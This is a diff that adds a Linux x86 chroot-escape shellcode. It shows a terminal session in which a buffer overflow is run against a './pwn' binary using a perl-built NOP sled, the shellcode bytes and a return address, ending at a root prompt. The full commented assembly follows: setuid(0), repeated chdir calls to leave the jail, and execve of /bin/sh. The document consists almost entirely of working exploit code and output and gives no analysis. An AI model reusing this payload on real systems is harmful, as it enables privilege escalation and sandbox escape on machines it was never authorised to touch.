@@ -1,0 +1,70 @@
+bt:/# ./pwn `perl -e 'print "\x90"x189 . "\xb0\x17\x31\xdb\xcd\x80\xb0\x27\x99\x52\x6a\x2e\x66\x68\x2e\x2e\x89\xe3\x66\xb9\xc0\x01\xcd\x80\xb0\x3d\x89\xe3\xcd\x80\x66\x5a\x31\xc9\x51\x66\x52\xb1\x64\xb0\x0c\x89\xe3\xcd\x80\xe2\xf8\xb0\x3d\x31\xc9\x88\x4c\x24\x01\x89\xe3\xcd\x80\xb0\x0b\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\xcd\x80" . "\xa9\xf6\xff\xbf"'`
+perl: warning: Setting locale failed.
+perl: warning: Please check that your locale settings:
+LANGUAGE = (unset),
+LC_ALL = (unset),
+LANG = "en_US.UTF-8"
+are supported and installed on your system.
+perl: warning: Falling back to the standard locale ("C").
+root@bt:/#
+
+
+; linux/x86 break chroot 79 bytes
+; root@thegibson
+; 2009-12-30
+
+section .text
+	global _start
+
+_start:
+	; setuid(0);
+	mov al, 23
+	xor ebx, ebx
+	int 0x80
+
+	; mkdir("...", 0700);
+	mov al, 39
+	cdq
+	push edx
+	push byte 0x2e
+	push word 0x2e2e
+	mov ebx, esp
+	mov cx, 0700o
+	int 0x80
+
+	; chroot("...");
+	mov al, 61
+	mov ebx, esp
+	int 0x80
+
+	; for (i = 100; i > 0; i--)
+	; {
+	; 	chdir("..");
+	; }
+	pop dx
+	xor ecx, ecx
+	push ecx
+	push dx
+	mov cl, 100
+	up:
+		mov al, 12
+		mov ebx, esp
+		int 0x80
+	loop up
+
+	; chroot(".");
+	mov al, 61
+	xor ecx, ecx
+	mov [esp + 1], cl
+	mov ebx, esp
+	int 0x80
+
+	; execve("//bin/sh", 0, 0);
+	mov al, 11
+	xor ecx, ecx
+	push ecx
+	push dword 0x68732f6e
+	push dword 0x69622f2f
+	mov ebx, esp
+	cdq
+	int 0x80
